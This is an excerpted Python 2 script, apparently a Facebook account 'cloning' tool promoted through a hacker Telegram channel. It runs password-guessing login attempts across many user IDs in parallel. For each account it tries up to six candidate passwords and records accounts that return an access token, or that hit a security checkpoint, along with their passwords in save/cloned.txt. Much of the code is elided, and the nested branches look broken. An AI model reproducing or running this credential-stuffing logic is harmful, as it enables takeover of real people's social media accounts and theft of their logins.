...
#Telegram :t.me/Best_Hacker00420
...
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mEdrisNabizada█████████████████▒▒▒▒▒▒▒▒..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
...
while (loop == 'true'):
    ...
    if (passcode == CorrectPasscode):
            print """
            \033[1;92mWelcome Edris-Nabizada Zone
                  """
            loop = 'false'
    else:
...
def action():
    ...
    jalan ("\033[1;92mEdris~Nabizada██████▒▒▒..99%Start Cracking...")
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m(EN-OK)  ' + k + c + user + '  |  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m(EN-CP) ' + k + c + user + '  |  ' + pass1
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m(EN-OK)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m(EN-CP) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m(EN-OK)  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m(EN-CP) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m(EN-OK)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m(EN-CP) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            ...
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;92m(EN-OK)  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m(EN-CP) ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
                                            ...
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;92m(EN-OK)  ' + k + c + user + '  |  ' + pass6
                                                okb = open('save/cloned.txt', 'a')
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m(EN-CP) ' + k + c + user + '  |  ' + pass6 
                                                    cps = open('save/cloned.txt', 'a')
    ...
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'Edris~Nabizada Process Has Been Completed██████▒▒▒▒...100%'
    print 'Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
    print('EN-TM Cloned Accounts Has Been Saved : save/cloned.txt')
    jalan("Note : Your Edris(EN-CP)Accounts Open after 5 to 8 days")
    print ''
    print """
...
\033[1;92m My Telegram\033[1;91m Muhammad Mohsin
\033[1;93mGitHub\033[1;97mmuhammad moshin
\033[1;94mInstagram\033[1;97m∆@error"""
